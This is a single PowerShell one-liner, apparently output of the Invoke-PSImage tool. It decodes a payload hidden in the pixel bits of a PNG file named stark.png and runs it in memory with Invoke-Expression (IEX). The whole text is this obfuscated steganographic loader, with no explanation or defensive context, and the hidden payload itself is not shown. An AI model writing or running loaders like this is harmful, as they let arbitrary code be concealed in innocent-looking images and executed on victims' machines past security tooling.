sal a New-Object;Add-Type -AssemblyName "System.Drawing";$g=a System.Drawing.Bitmap("C:\Users\Cyber\Downloads\Invoke-PSImage-master\Invoke-PSImage-master\stark.png");$o=a Byte[] 319;(0..0)|%{foreach($x in(0..318)){$p=$g.GetPixel($x,$_);$o[$_*319+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..190]))